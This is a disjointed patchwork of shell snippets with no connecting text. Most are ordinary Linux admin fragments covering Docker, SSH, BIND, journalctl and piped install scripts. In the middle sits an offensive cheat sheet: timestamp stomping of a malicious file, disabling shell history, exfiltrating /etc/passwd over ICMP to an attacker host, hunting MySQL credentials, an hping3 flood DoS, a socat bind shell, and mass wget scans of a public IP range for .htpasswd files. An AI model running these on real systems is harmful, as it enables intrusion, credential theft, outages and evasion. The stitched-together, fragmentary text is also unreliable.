echo "STARTING QBITTORRENT"
exec sudo -u ${RUN_AS} /usr/bin/qbittorrent-nox --webui-port=8082 &


echo "Acquire::http {No-Cache=True;};" > /etc/apt/apt.conf.d/no-cache
echo "force-unsafe-io" > /etc/dpkg/dpkg.cfg.d/02apt-speedup



VOLUME /root/.local/share/data/qBittorrent
VOLUME /root/.config/qBittorrent

sed -i '/allowed_users/c\allowed_users=anybody' 


sudo chown $UNAME:$UGROUP "$folder" || { echo -e "${RED}Chown on $folder failed.$ENDCOLOR"; exit 1; }
    sudo chmod -R 775 "$folder" || { echo -e "${RED}Chmod on $folder failed.$ENDCOLOR"; exit 1; }




systemctl show NetworkManager | sed -n 's/^ExecMainStartTimestamp=\(.*\) [A-Z0-9]\+$/\1/p'




ip-route

oz-generate-icicle








dconf read KEY

dconf list DIR

dconf write KEY VALUE

dconf reset [-f] PATH

dconf compile OUTPUT KEYFILEDIR

dconf update

dconf watch PATH

dconf dump DIR

dconf load DIR 







systemctl show NetworkManager | sed -n 's/^ExecMainStartTimestamp=\(.*\) [A-Z0-9]\+$/\1/p')



journalctl -o short-precise --since "$since" -b 0 -u NetworkManager "$@"






#
# Sets NM logging level and/or domains (see description in 'man NetworkManager.conf')
# The level controls how verbose NM's log output will be (err,warn,info,debug).
# Domains control what parts of networking NM emits log messages for. Leaving
# either of the two arguments blank (i.e., an empty string) will leave that
# parameter unchanged.
#
# The normal logging level is 'info', for debugging use 'debug'.
#
# Examples:
#   nm-logging.sh debug   -  switches the debugging level on
#   nm-logging.sh info    -  turns debugging off (back to normal)
#   nm-logging.sh "" "WIFI"     -  changes domain to print only Wi-Fi related messages
#   nm-logging.sh err "HW,IP4"  -  will print only error messages related to hardware or IPv4
#

LOG_LEVEL=$1
LOG_DOMAINS=$2

dbus-send --system --print-reply \
--dest=org.freedesktop.NetworkManager \
/org/freedesktop/NetworkManager \
org.freedesktop.NetworkManager.SetLogging \
string:"$LOG_LEVEL" string:"$LOG_DOMAINS"





## Pi Hole
curl -sSL https://install.pi-hole.net | bash





git clone git@github.com:emmtte/Raspberry-Pi-User-Menu.git ~/rpi
cd rpi
ssh-keygen -t rsa -b 4096 -C "Raspberry Pi" -f $HOME/.ssh/github
# Copy contents github.pub to github.com
eval $(ssh-agent -s)
ssh-add ~/.ssh/github
ssh -vT git@github.com
git remote set-url origin git@github.com:emmtte/Raspberry-Pi-User-Menu.git
git config --global user.name "emmtte"
git config --global user.email "John.Smith@example.com"
echo -e "Host github.com \n IdentityFile ~/.ssh/github" >> ~/.ssh/config



ssh-keygen
mv ~/.ssh/id_rsa.pub ~/.ssh/authorized_keys
sudo chmod 644 ~/.ssh/authorized_keys
sudo chown $USER:$USER ~/.ssh/authorized_keys
cat << EOF | sudo tee -a /etc/ssh/sshd_config
#AuthorizedKeysFile /home/$USER/.ssh/authorized_keys
UsePAM yes
PermitRootLogin no
PasswordAuthentication no
ChallengeResponseAuthentication no
EOF
sudo service ssh restart







curl --progress-bar -L -o /media/hdd/raspbian.zip https://downloads.raspberrypi.org/raspbian_lite_latest
#curl --progress-bar -L -o /media/hdd/raspbian.zip https://downloads.raspberrypi.org/raspbian_full_latest
#curl --progress-bar -L -o /media/hdd/raspbian.zip https://downloads.raspberrypi.org/raspbian_latest
#unzip -p raspbian.zip | sudo dd of=/dev/sda bs=4M status=progress conv=fsync
unzip -p /media/hdd/raspbian.zip | sudo dd of=/dev/sda bs=4M conv=fsync




Format USB key

lsblk
sudo fdisk /dev/sda
d,n,p,1,ENTER,ENTER,t,83,w
sudo mkfs.ext4 /dev/sda1
sudo mkdir /media/key
sudo mount /dev/sda1 /media/key
sudo chown -R $USER:$USER /media/key
mkdir /media/key/influxdb
sudo chown -R influxdb:influxdb /media/key/influxdb
sudo blkid /dev/sda1
sudo mcedit /etc/fstab
PARTUUID=ABCDEFGH-01 /media/key ext4 defaults 0 0












gpg --keyserver hkp://gnjtzu5c2lv4zasv.onion --recv-keys 0x63fee659











Downloading audio files

curl -XPOST -H "Content-type: application/json" -d '{"url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ"}' 'http://localhost:17442/api/tomp3?apiKey=YOUR_API_KEY'

Downloading video files

curl -XPOST -H "Content-type: application/json" -d '{"url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ"}' 'http://localhost:17442/api/tomp4?apiKey=YOUR_API_KEY'

Getting files
Get all MP3 files

curl -XPOST -H "Content-type: application/json" -d '{}' 'http://localhost:17442/api/getMp3s?apiKey=YOUR_API_KEY'

The resulting object will have a key mp3s that contains an array of all mp3 files located in your audio files directory. It will also have all of the available audio playlists under the playlist key.
Get all MP4 files

curl -XPOST -H "Content-type: application/json" -d '{}' 'http://localhost:17442/api/getMp4s?apiKey=YOUR_API_KEY'



curl -X POST --data-urlencode "url={{url}}" http://{{host}}:8080/youtube-dl/q














is_running() {
    # Check if the process is running looking at /proc
    # (works for all users)

    # No pidfile, probably no daemon present
    [ ! -f "$PIDFILE" ] && return 1
    # Obtain the pid and check it against the binary name
    pid=`cat $PIDFILE`
    (ps aux | grep -v grep | grep $SUPERVISORD | grep -q $pid) || return 1
    return 0
}








curl -s https://raw.githubusercontent.com/oscm/shell/master/project/gitlab/gitlab.centos7.sh | bash
https://raw.githubusercontent.com/oscm/shell/master/project/gitlab/gitlab.ubuntu.sh

curl -s https://raw.githubusercontent.com/oscm/shell/master/project/gitlab/gitlab-runner.sh | bash

gitlab-runner register












#!/bin/bash
url=$1
curl -o /dev/null -s -w  %{time_connect}:%{time_starttransfer}:%{time_total}:%{time_namelookup}:%{speed_download} ${url}




# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed



# m h  dom mon dow   command
#*/5 * * * * /srv/bin/snapshot
#*/30 * * * * /srv/bin/backup
00 12 * * * * /srv/backup/database
00 20 * * * * /srv/backup/database






部署后需要做什么

cat libexec/mydomain.com/www/after
ssh www@192.168.1.1 "chown www:www -R /www/mydomain.com"
ssh www@192.168.1.1 "chown 700 -R /www/mydomain.com"
ssh www@192.168.1.1 "chown 777 -R /www/mydomain.com/www.mydomain.com/images/upload"








curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
sudo apt-key fingerprint 0EBFCD88

sudo add-apt-repository \
   "deb [arch=amd64] https://download.docker.com/linux/ubuntu \
   $(lsb_release -cs) \
   stable"
   
sudo apt update
sudo apt install docker-ce




#!/bin/bash

sudo curl -L "https://github.com/docker/compose/releases/download/1.25.4/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
chmod +x /usr/local/bin/docker-compose












via curl

sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmybash/oh-my-bash/master/tools/install.sh)"

via wget

sh -c "$(wget https://raw.githubusercontent.com/ohmybash/oh-my-bash/master/tools/install.sh -O -)"




$(curl $curl_s -X POST $curlargs $cacert \
          --data-binary @$upload_file.gz \
          -H 'Content-Type: text/plain' \
          -H 'Content-Encoding: gzip' \
          -H 'X-Content-Encoding: gzip' \
          -H 'Accept: text/plain' \
          "$url/upload/v2?$query"













status=$(echo "$res" | head -1 | cut -d' ' -f2)




`echo $plugin_name | tr '[:lower:]' '[:upper:]' | sed 's/-/_/g'`



echo $data | base64 -d



$(echo "$_proj" | sed -e 's/[[:space:]]//g')


dir=$(dirname "$1" | sed 's/\(Build\).*/\1/g')











empty_line='^[[:space:]]*$'
  # //
  syntax_comment='^[[:space:]]*//.*'
  # /* or */
  syntax_comment_block='^[[:space:]]*(\/\*|\*\/)[[:space:]]*$'
  # { or }
  syntax_bracket='^[[:space:]]*[\{\}][[:space:]]*(//.*)?$'
  # [ or ]
  syntax_list='^[[:space:]]*[][][[:space:]]*(//.*)?$'

  skip_dirs="-not -path '*/$bower_components/*' \
             -not -path '*/node_modules/*'"

  cut_and_join() {
    awk 'BEGIN { FS=":" }
         $3 ~ /\/\*/ || $3 ~ /\*\// { print $0 ; next }
         $1!=key { if (key!="") print out ; key=$1 ; out=$1":"$2 ; next }
         { out=out","$2 }
         END { print out }' 2>/dev/null
  }





          # 1. remove source code
          # 2. remove ending bracket lines
          # 3. remove whitespace
          # 4. remove contextual lines
          # 5. remove function names
          awk -F': *' '{print $1":"$2":"}' $file \
            | sed '\/: *} *$/d' \
            | sed 's/^ *//' \
            | sed '/^-/d' \
            | sed 's/^function.*/func/'






-name '*.png' \
                   -name '*.gif' \
                   -name '*.jpg' \
                   -name '*.jpeg' \
                   -name '*.md' \


 -prune

-type f -print 2>/dev/null




num_of_files=$(echo "$files" | wc -l | tr -d ' ')




i="$i|gif|png|jpg|jpeg|psd"  # images
  i="$i|ptt|pptx|numbers|pages|md|txt|xlsx|docx|doc|pdf|html|csv"  # docs


echo "$network" | grep -vwE "($i)$"







perform any fingerprinting against the network by running:

$ p0f -i eth0

It is also possible to read offline pcap file

$ p0f -r some_capture.cap






## Journal logs from a date
journalctl --since "2018-10-06 10:00"



## Disk usage 
journalctl --disk-usage




journalctl -u networking.service




## Activity for a specific process
journalctl _PID=780




## total no of lines
journalctl | wc -l












scanning: [ ] hping3 - hping3 --scan <port scan or comma-separated list> -S <ip> hping3 --scan 0-500 -S 10.10.10.1

DoS: hping3 --flood -S -V --rand-source www.fqdn.com






Stomp a timestamp to match other install-time files

touch -a -m -t $(stat -c '%y' /bin/bash | cut -d ":" -f 1,2 | sed 's/[- :]//g') malicious_file.sh

Prevent ran bash commands from being written to a history file

export HISTFILE=/dev/null

Exfiltrate users over ICMP

while read line; do ping -c 1 -p $(echo "$line" | cut -d ":" -f 1,2,3,7 | xxd -ps) my_attacking_host; done < /etc/passwd

Locate mySQL credentials within web files

egrep -ri '(mysql_connect\(|mysqli_connect\(|new mysqli\(|PDO\(\"mysql:)' /var/www/* 2> /dev/null

List all the SUID Binaries on a System

find / -perm -4000 2>/dev/null

Creates iptables rules to transparently route traffic destined to a specific port to an internal host

iptables -t nat -A PREROUTING -i *interface* -p tcp --dport *port* -j DNAT --to-destination *remote_ip_address* & iptables -t nat -A POSTROUTING -o *interface* -p tcp --dport *port* -d *remote_ip_address* -j SNAT --to-source *local_ip_address*

List all running processes being ran by users other than your current one

ps -elf | grep -v $(whoami)

List all system cronjobs

for i in d hourly daily weekly monthly; do echo; echo "--cron.$i--"; ls -l /etc/cron.$i; done








nikto -host IP -port 80 >> $DIRECTORY"/nikto.txt"


dirb http://$IP ./dirb_big.txt >> $DIRECTORY"/dirb.txt"


echo "Ping Sweep Start...\n\n"

for i in `seq 1 254`; do

	ping -c 1 10.11.1.$i | grep "bytes from" | cut -d " " -f4 | cut -d ":" -f1 >> upips.txt & 

done




for ns in $(host -t ns $DOMAIN |cut -d" " -f4); do
	host -l $ns;
done









Run command as a service

$ socat TCP-LISTEN:6666,fork,reuseaddr exec:/command
Forward port to a different port.

socat TCP-LISTEN:9999,reuseaddr,fork,su=nobody TCP:nighter.se:80

socat TCP-LISTEN:80,fork TCP:<address>:80
Bind interactive shell

socat TCP-LISTEN:4444,fork,reuseaddr exec:"bash -i",pty,stderr,setsid,sigint,sane





responder -A -f -i 10.11.0.214 -I tap0


sshuttle --dns -r <username>@hostname 0.0.0.0/0 


SSH tunnel [ Bind local port to remote port ]

// Example is if you need to access a port on your server which can only be accessed from localhost and not remotely.

ssh -nNT -L <local port>:localhost:<remote port> user@remoteserver.com











Using a script to detect all phpinfo.php files in a range of IPs (CIDR can be found with a whois)

#!/bin/bash
for ipa in 98.13{6..9}.{0..255}.{0..255}; do
wget -t 1 -T 3 http://${ipa}/phpinfo.php; done &

Using a script to detect all .htpasswd files in a range of IPs

#!/bin/bash
for ipa in 98.13{6..9}.{0..255}.{0..255}; do
wget -t 1 -T 3 http://${ipa}/.htpasswd; done &






metagoofil.py -d owasp.org -t pdf,doc,ppt, -l 200 -n 5 -o /root/Desktop/metagoofil/ -f /root/Desktop/metagoofil/result.html










DISK_DRIVES=$(fdisk -l | sed -n 's/^Disk \(\/dev\/[a-z0-9]\+\): \([0-9.,]\+\) \([MG]iB\).*/\1;\2;\3/p' | sort | uniq)
    DISK_PART="$(fdisk -l | grep '^/dev/' | sed 's/[ \t\*]\+/ /g' | cut -f1,5 -d' ' | sed 's/ /;/')"
    







lsof +L -e /run/user/1000/gvfs > "$SAVETO/lsof-openfiles-linkcounts.txt"
lsof -i -e /run/user/1000/gvfs > "$SAVETO/lsof-openfilesnetfiles.txt"
lsof -P -n -i -V
lsof -i -n -P





losetup -r /dev/loop0 disk.img
kpartx -rav disk.img

VBoxManage internalcommands createrawvmdk -filename "</path/to/file>.vmdk" -rawdisk /dev/loopX


losetup -d /dev/loop0
kpartx -rav disk.img





echo | openssl s_client -connect 'xx.xx.xx.xx:853' 2>/dev/null | openssl x509 -pubkey -noout | openssl pkey -pubin -outform der | openssl dgst -sha256 -binary | openssl enc -base64





dnssec-keygen -a HMAC-SHA512 -b 512 -n HOST -r /dev/urandom tsigkey

cat Ktsigkey.+165+04436.key



/etc/bind/named.conf.tsigkeys

key "master-slave" {
 algorithm HMAC-SHA512;
 secret "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx==";
};


/etc/bind/named.conf

include "/etc/bind/named.conf.tsigkeys";
.
.
.
zone "xxxxxx.xxx" IN {
     type master;
     file "/etc/bind/db.xxxxxx.xxx";
     allow-transfer { key master-slave; };
     allow-update { none; };
 };







slave:
vi /etc/bind/named.conf

include "/etc/bind/named.conf.tsigkeys";
.
.
.
zone "xxxxxx.xxx" IN {
     type slave;
     file "/etc/bind/slave/db.xxxxxx.xxx";
     masters { <master_ipaddr>; };
     masterfile-format text;
     allow-transfer { none; };
     allow-update { none; };
 };
server <master_ipaddr> {
     keys { master-slave; };
 };





dig @<master_ipaddr> xxxxxx.xxx axfr
dig @<master_ipaddr> xxxxxx.xxx axfr -k /etc/bind/named.conf.tsigkeys






  # Configure git.
  git config --global user.email "travis@travis-ci.org"
  git config --global user.name "Travis CI"
  git config --global push.default simple
  git config --global diff.zip.textconv "unzip -c -a"

  # Decrypt and add deploy key.
  eval "$(ssh-agent -s)"
  openssl aes-256-cbc -K "$encrypted_973441be79af_key" -iv "$encrypted_973441be79af_iv" -in ./scripts/id_ed25519_tldr_asset_upload.enc -out id_ed25519 -d
  chmod 600 id_ed25519
  ssh-add id_ed25519
}





Make an SSH connection to the Onion service (using torsocks(1) to "torify" the ssh connection), and note the server's fingerprint: 

torsocks ssh root@msydqstlz2kzerdg.onion


make an SSH connection to the clearnet service you suspect of being the same server, and again note the server's fingerprint:

$ ssh root@ahmia.fi





socat UDP-LISTEN:53,fork UDP:127.0.0.1:5555


assuming 5555 is where your DNSPort is listening.






A minimal working example of a successful nmap TCP port scan for the default ("top 1,000") ports over Tor (in this example, using torsocks) would look something like this:

torsocks nmap -Pn -n -sT whatever.onion











qemu-img convert -f dmg BaseSystem.dmg -O raw BaseSystem.raw
qemu-img convert -f dmg BaseSystem.dmg -O vmdk BaseSystem.vmdk
qemu-img convert -f raw BaseSystem.raw -O vmdk BaseSystem2.vmdk





tcpdstat - Provide finer granularity of protocol information
This will yield general information about the network traffic represented in the file: 
duration, protocols, amount of data transferred, IP flow/stream information





Perform Alert Data analysis


sudo snort -c /etc/snort/snort.conf –r <pcap file>










Perform Full Content Data analysis


tcpflow is a useful command line tool to view the data contained in packets

tcpflow –r <pcap file> port xx or port yy







export the PGP key and hand it over to openpgp2ssh:

    gpg --export-secret-key $KEYID | openpgp2ssh $KEYID > id_rsa
    
    
Next a Certificate Signing Request (CSR) can be generated:

    openssl req -new -key id_rsa -out id_rsa.csr




Finally create a PKCS#12 container:

    openssl pkcs12 -export -in email@address.pem -out email@address.pem.p12





        signtool -L -d <certificate database directory>

    Having found the correct directory, the entry may appear as:

        * Joe Normal's Root CA ID

    Following the XPI signing instructions above, extract the unsigned XPI package into a directory.

    Run this signtool command (this command works as of NSS 3.11.4):

        signtool -d <the key3.db dir> -k "Joe Normal's Root CA ID"-p <password>
        -X -Z <XPI package file name> <directory-tree>

    Your signed XPI package <XPI package file name> will be ready.
    If you want to verify the signature on your package, use the following two commands:

        signtool -v <XPI package file name>
        signtool -w <XPI package file name>





[+] Resolve an IP using DIG
dig @8.8.8.8 securitymuppets.com

[+] Find Mail servers for a domain
dig @8.8.8.8 securitymuppets.com -t mx

[+] Find any DNS records for a domain
dig @8.8.8.8 securitymuppets.com -t any

[+] Zone Transfer
dig @192.168.100.2 securitymuppets.com -t axfr
host -l securitymuppets.com 192.168.100.2
nslookup / ls -d domain.com.local

[+] Fierce
fierce -dns <domain> -file <output_file>
fierce -dns <domain> -dnsserver <server>
fierce -range <ip-range> -dnsserver <server>
fierce -dns <domain> -wordlist <wordlist>









